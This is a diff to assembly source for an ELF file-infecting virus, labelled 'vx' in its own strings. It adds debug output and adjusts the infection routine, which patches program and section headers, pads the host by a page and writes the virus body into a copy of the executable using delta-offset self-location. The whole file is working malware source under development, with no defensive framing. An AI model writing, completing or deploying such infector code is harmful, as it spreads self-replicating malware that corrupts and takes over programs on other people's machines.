@@ -368,18 +368,36 @@ PAGESIZE dd 4096
 ;filenamepass db 'File is not vx file gospel, good to continue', 13, 10, 0
 ;filenamepasslen equ $-filenamepass
 ;
-;checkphdrstart db 'Beginning of phdr_loop', 13,10,0
-;checkphdrstartlen equ $-checkphdrstart
-;
-;checkptloadpass db 'Segment is PT_LOAD!', 13, 10, 0
-;checkptloadpasslen equ $-checkptloadpass
+checkphdrstart db 'Beginning of phdr_loop', 13,10,0
+checkphdrstartlen equ $-checkphdrstart
+
+checkptloadpass db 'Segment is PT_LOAD!', 13, 10, 0
+checkptloadpasslen equ $-checkptloadpass
+checkptloadfail db 'Segment is not PT_LOAD :( going to next one', 13, 10, 0
+checkptloadfaillen equ $-checkptloadfail
+
+checkphdrRXpass db 'Phdr is .text segment!', 13, 10, 0
+checkphdrRXpasslen equ $-checkphdrRXpass
+
+checkphdrRWpass db 'Phdr is .data segment!', 13, 10, 0
+checkphdrRWpasslen equ $-checkphdrRWpass
+
+checkshdrstart db 'Beginning of shdr_loop', 13,10,0
+checkshdrstartlen equ $-checkshdrstart
+
+modvxshdrpass0 db 'VX Shdr pass 0 success', 13,10,0
+modvxshdrpass0len equ $-modvxshdrpass0
+modvxshdrpass1 db 'VX Shdr pass 1 success', 13,10,0
+modvxshdrpass0len equ $-modvxshdrpass1
+modsubsequentshdr db 'Modifying Shdr after vx Shdr', 13,10,0
+modsubsequentshdrlen equ $-modsubsequentshdr
 ;checkptloadfail db 'Segment is not PT_LOAD :( going to next one', 13, 10, 0
 ;checkptloadfaillen equ $-checkptloadfail
-;
-;textsegmentoffset_pageyes db 'offset to beginning of .text segment in host is > PAGESIZE', 13, 10, 0
-;textsegmentoffset_pageyes_len equ $-textsegmentoffset_pageyes
-;textsegmentoffset_pageno db 'offset to beginning of .text segment in host is < PAGESIZE', 13, 10, 0
-;textsegmentoffset_pageno_len equ $-textsegmentoffset_pageno
+
+textsegmentoffset_pageyes db 'offset to beginning of .text segment in host is > PAGESIZE', 13, 10, 0
+textsegmentoffset_pageyes_len equ $-textsegmentoffset_pageyes
+textsegmentoffset_pageno db 'offset to beginning of .text segment in host is < PAGESIZE', 13, 10, 0
+textsegmentoffset_pageno_len equ $-textsegmentoffset_pageno
 ;****************************************************************************************
 
 ;variables used for phdr and shdr manipulation routines
@@ -600,8 +618,8 @@ check_file:
 			cmp byte [rsi], 0x0
 			jne .copy_filename
 		
-		mov r13, [r14 + 160]		;linuxdirent.d_nameq
-		call _write
+	;	mov r13, [r14 + 160]		;linuxdirent.d_nameq
+	;	call _write
 		xor rax, rax
 		push r9
 	check_filename:
@@ -800,8 +818,8 @@ payload:
 	mov rdi, STDOUT
 	syscall
 	
-	;jmp _restore
-	jmp checknext
+	jmp _restore
+	;jmp checknext
 
 ;****************************************************************************************
 ;	Infection routine:
@@ -875,17 +893,29 @@ infect:
 			cmp word [r13 + r12 + elf_phdr.p_type], PT_LOAD			
 			jne .mod_subsequent_phdr
 			.mod_curr_header:
+				;mov r12, checkptloadpasslen
+				;lea r13, checkptloadpass
+				;call _write
+				mov rdx, checkptloadpasslen
+				lea rsi, checkptloadpass
+				mov rdi, STDOUT
+				mov rax, SYS_WRITE
+				syscall
 				cmp dword [r13 + r12 + elf_phdr.p_flags], PFLAGS_RX
 				je .mod_phdr_text_segment			
 				cmp dword [r13 + r12 + elf_phdr.p_flags], PFLAGS_RW
 				je .mod_phdr_data_segment			
 				jne .mod_subsequent_phdr
 				.mod_phdr_text_segment:			
-					;mov rdx, checkptloadpasslen
-					;lea rsi, checkptloadpass
-					;mov rdi, STDOUT
-					;mov rax, SYS_WRITE
-					;syscall
+					;mov r12, checkphdrRXpasslen
+					;lea r13, checkphdrRXpass
+					;call _write
+					mov rdx, checkphdrRXpasslen
+					lea rsi, checkphdrRXpass
+					mov rdi, STDOUT
+					mov rax, SYS_WRITE
+					syscall
+				
 					mov r10, [r13 + r12 + elf_phdr.p_vaddr] 	;entry virtual addr (evaddr) = phdr->p_vaddr + phdr->p_filesz
 					add r10, [r13 + r12 + elf_phdr.p_filesz]
 					mov qword [evaddr], r10				;save evaddr
@@ -901,23 +931,31 @@ infect:
 					add qword [r13 + r12 + elf_phdr.p_memsz], vlen
 					jmp .next_phdr				;this jmp might be unneccessary but adding it for testing	
 				.mod_phdr_data_segment:			
+					;mov r12, checkphdrRWpasslen
+					;lea r13, checkphdrRWpass
+					;call _write
+					mov rdx, checkphdrRWpasslen
+					lea rsi, checkphdrRWpass
+					mov rdi, STDOUT
+					mov rax, SYS_WRITE
+					syscall
 					mov r11, [r13 + r12 + elf_phdr.p_offset]
 					mov dword [data_offset_og],  r11d
 					mov qword [data_offset_original],  r11
 					add dword r11d, [PAGESIZE]
 					mov dword [r13 + r12 + elf_phdr.p_offset], r11d
 					mov dword [data_offset_new_padding],  r11d
-					mov r10, [r13 + r12 + elf_phdr.p_vaddr] 	;entry virtual addr (evaddr) = phdr->p_vaddr + phdr->p_filesz
-					add dword r10d, [PAGESIZE]
-					mov dword [r13 + r12 + elf_phdr.p_vaddr], r10d
-					mov r10, [r13 + r12 + elf_phdr.p_paddr] 	;entry virtual addr (evaddr) = phdr->p_vaddr + phdr->p_filesz
-					add dword r10d, [PAGESIZE]
-					mov dword [r13 + r12 + elf_phdr.p_paddr], r10d
+					;mov r10, [r13 + r12 + elf_phdr.p_vaddr] 	;entry virtual addr (evaddr) = phdr->p_vaddr + phdr->p_filesz
+					;add dword r10d, [PAGESIZE]
+					;mov dword [r13 + r12 + elf_phdr.p_vaddr], r10d
+					;mov r10, [r13 + r12 + elf_phdr.p_paddr] 	;entry virtual addr (evaddr) = phdr->p_vaddr + phdr->p_filesz
+					;add dword r10d, [PAGESIZE]
+					;mov dword [r13 + r12 + elf_phdr.p_paddr], r10d
 					jmp .next_phdr				;this jmp might be unneccessary but adding it for testing	
 			.mod_subsequent_phdr:
 				xor r11, r11
 				mov r11, [r13 + r12 + elf_phdr.p_offset]
-				cmp dword r11d, [vxoffset]
+				cmp dword r11d, vxoffset
 				jl .next_phdr
 				add dword r11d, [PAGESIZE]
 				mov dword [r13 + r12 + elf_phdr.p_offset], r11d
@@ -940,10 +978,20 @@ infect:
 	mov word cx, [r13 + 60]											; elf_ehdr.e_shnum
 
 	check_shdrs:
+		mov rdx, checkshdrstartlen
+		lea rsi, checkshdrstart
+		mov rdi, STDOUT
+		mov rax, SYS_WRITE
+		syscall
 		.shdr_loop:
 			push rcx
 			cmp dword [r13 + r15 + elf_shdr.sh_offset], vxoffset
 			jge .mod_subsequent_shdr
+			mov rdx, modvxshdrpass0len
+			lea rsi, modvxshdrpass0
+			mov rdi, STDOUT
+			mov rax, SYS_WRITE
+			syscall
 			mov r11, [r13 + r15 + elf_shdr.sh_addr]
 			add dword r11d, [r13 + r15 + elf_shdr.sh_size]
 			cmp dword r11d, vxoffset
@@ -953,6 +1001,11 @@ infect:
 			mov [r13 + r15 + elf_shdr.sh_size], r10
 
 			.mod_subsequent_shdr:
+				mov rdx, modsubsequentshdrlen
+				lea rsi, modsubsequentshdr
+				mov rdi, STDOUT
+				mov rax, SYS_WRITE
+				syscall
 				mov r11, [r13 + r15 + elf_shdr.sh_offset]
 				add dword r11d, [PAGESIZE]
 				mov dword [r13 + r15 + elf_shdr.sh_offset], r11d
@@ -1046,10 +1099,16 @@ frankenstein_elf:
 		lea rsi, [r13]					;r13 contains pointer to mmap'd file
 		mov rax, SYS_WRITE
 		syscall
+
+
 	.write_virus_totemp:
+		call .delta
+		.delta:
+			pop rax
+			sub rax, .delta
 		mov rdi, r9
 		mov rdx, vlen
-		mov rsi, _start
+		lea rsi, [rax + _start]
 		mov r10d, dword [vxoffset]
 		mov rax, SYS_PWRITE64
 		syscall
@@ -1082,6 +1141,7 @@ frankenstein_elf:
 		;mov rsi, qword [data_offset_new_padding]
 		mov rax, SYS_FTRUNCATE
 		syscall
+;		jmp .close_temp
 
 	.write_datasegment_totemp:
 		mov rdx, qword [oshoff]
@@ -1134,9 +1194,9 @@ _restore:
 	pop rbp
 	
 ;exit
+vlen equ $-_start
 _end:
 	xor rdi, rdi
 	mov rax, 0x3c ;exit() syscall on x64
 	syscall	
 
-vlen equ $-_start
